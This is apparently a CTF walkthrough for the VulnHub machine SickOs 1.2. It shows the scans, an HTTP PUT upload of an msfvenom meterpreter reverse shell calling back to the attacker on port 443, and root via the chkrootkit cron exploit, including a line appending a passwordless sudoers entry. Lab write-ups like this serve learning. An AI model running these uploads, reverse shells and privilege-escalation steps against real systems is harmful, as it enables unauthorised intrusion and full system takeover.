# INTRO
This is the second SickOs machine in the series. The objective of this machine being gaining the highest privileges on the system. This was extremely hard and frustrating due to the cronjobs not triggering and the http PUT part.

# RECON AND ENUM
Using netdiscover I acquired the local ip of the machine and ran an nmap scan on the ip.
```
└─# nmap -A -sC -sV -Pn 192.168.1.160
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-02 14:25 +04
Nmap scan report for 192.168.1.160
Host is up (0.016s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 668cc0f2857c6cc0f6ab7d480481c2d4 (DSA)
|   2048 ba86f5eecc83dfa63ffdc134bb7e62ab (RSA)
|_  256 a16cfa18da571d332c52e4ec97e29eaf (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: lighttpd/1.4.28
MAC Address: 1A:D6:C7:1E:AC:46 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT      ADDRESS
1   15.81 ms 192.168.1.160

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.75 seconds
```
I can see the port 80 open so I go to the webpage. The index page has nothing special, other than a meme and nothing in the page source either. I run a nikto scan to check for vulnerabilities but there are none shown by nikto.
```
└─# nikto -h 192.168.1.160                              
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.160
+ Target Hostname:    192.168.1.160
+ Target Port:        80
+ Start Time:         2023-01-02 14:35:59 (GMT4)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.28
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ All CGI directories 'found', use '-C none' to test none
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
+ 26545 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2023-01-02 14:51:55 (GMT4) (956 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
So I run a dirb scan to check for potential vulnerabilities in directories.
```
└─# dirb http://192.168.1.160 -w

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jan  2 15:09:06 2023
URL_BASE: http://192.168.1.160/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Stopping on warning messages

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.160/ ----
+ http://192.168.1.160/index.php (CODE:200|SIZE:163)                                                                                                                                                                                         
==> DIRECTORY: http://192.168.1.160/test/                                                                                                                                                                                                    
                                                                                                                                                                                                                                             
---- Entering directory: http://192.168.1.160/test/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                             
-----------------
END_TIME: Mon Jan  2 15:10:43 2023
DOWNLOADED: 9224 - FOUND: 1
```
# EXPLOITATION
After a while I decided to check for HTTP options.

```
└─# nmap 192.168.1.160 -p80 --script http-methods --script-args http-methods.url-path="/test"
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-02 15:33 +04
Nmap scan report for 192.168.1.160
Host is up (0.11s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET HEAD POST OPTIONS
|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
|_  Path tested: /test
MAC Address: 1A:D6:C7:1E:AC:46 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 15.23 seconds
```
I uploaded shells several times and realised they didnt work because some ports were blocked. Eventually though the port 443 worked. Then using msfvenom I generated a shell to upload.
```
└─# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.135 LPORT=443 -f raw -o shell4.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1113 bytes
Saved as: shell4.php
```
```
└─# curl -T shell4.php --url http://192.168.1.160/test/shell4.php -0 --http1.0
```
# PRIVILEGE ESCALATION
Then I set up a listener on msfconsole for a meterpreter session. After a while of searching I finally checked the cron jobs and on the daily jobs I found an older version of chkrootkit, instantly I search for exploits.
```
meterpreter > ls -l /etc/cron.daily
Listing: /etc/cron.daily
========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  102    fil   2012-06-20 00:26:10 +0400  .placeholder
100755/rwxr-xr-x  15399  fil   2013-11-15 19:36:00 +0400  apt
100755/rwxr-xr-x  314    fil   2013-04-19 03:54:59 +0400  aptitude
100755/rwxr-xr-x  502    fil   2012-03-31 15:56:34 +0400  bsdmainutils
100755/rwxr-xr-x  2032   fil   2014-06-04 17:10:50 +0400  chkrootkit
100755/rwxr-xr-x  256    fil   2013-10-14 14:22:44 +0400  dpkg
100755/rwxr-xr-x  338    fil   2011-12-20 18:34:07 +0400  lighttpd
100755/rwxr-xr-x  372    fil   2011-10-05 00:50:48 +0400  logrotate
100755/rwxr-xr-x  1365   fil   2012-12-28 20:24:07 +0400  man-db
100755/rwxr-xr-x  606    fil   2011-08-17 17:16:11 +0400  mlocate
100755/rwxr-xr-x  249    fil   2012-09-13 02:29:26 +0400  passwd
100755/rwxr-xr-x  2417   fil   2011-07-02 01:25:55 +0400  popularity-contest
100755/rwxr-xr-x  2947   fil   2012-06-20 00:26:10 +0400  standard
```
Every time the cron daily task is triggered so is chkrootkit and since it is run as root we can use this by writing malicious code to /tmp/update. I wrote the following.
```
chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers
```
I waited for a while for the cron job to execute but nothing came of it. Frustrated I turned to metasploit, searchsploit showed me the exploit and then I did the following.
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set lhost 192.168.1.135
lhost => 192.168.1.135
msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.1.135:443 
[*] Sending stage (39927 bytes) to 192.168.1.160
[*] Meterpreter session 1 opened (192.168.1.135:443 -> 192.168.1.160:37045) at 2023-01-03 16:42:20 +0400

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/unix/local/chkrootkit
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(unix/local/chkrootkit) > set session 1
session => 1
```
Then I ran the exploit on the first session on metasploit and it worked.
```
msf6 exploit(unix/local/chkrootkit) > set payload cmd/unix/python/meterpreter/reverse_tcp
payload => cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(unix/local/chkrootkit) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Started reverse TCP handler on 192.168.1.135:443 
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
[*] Sending stage (24380 bytes) to 192.168.1.160
[+] Deleted /tmp/update
[*] Meterpreter session 2 opened (192.168.1.135:443 -> 192.168.1.160:37044) at 2023-01-03 16:35:02 +0400

meterpreter > ls
Listing: /root
==============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100600/rw-------  3066   fil   2016-04-26 15:01:22 +0400  .bash_history
100644/rw-r--r--  3106   fil   2012-04-19 13:15:14 +0400  .bashrc
040700/rwx------  4096   dir   2016-04-12 19:37:42 +0400  .cache
100644/rw-r--r--  140    fil   2012-04-19 13:15:14 +0400  .profile
100644/rw-r--r--  39421  fil   2015-04-09 18:43:05 +0400  304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz
100400/r--------  491    fil   2016-04-26 14:58:11 +0400  7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
040755/rwxr-xr-x  4096   dir   2016-04-12 19:42:58 +0400  chkrootkit-0.49
100644/rw-r--r--  541    fil   2016-04-26 09:48:24 +0400  newRule

meterpreter > shell -t
Process 18100 created.
Channel 1 created.
root@ubuntu:~# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

Thanks for giving this try.

@vulnhub: Thanks for hosting this UP!.

```
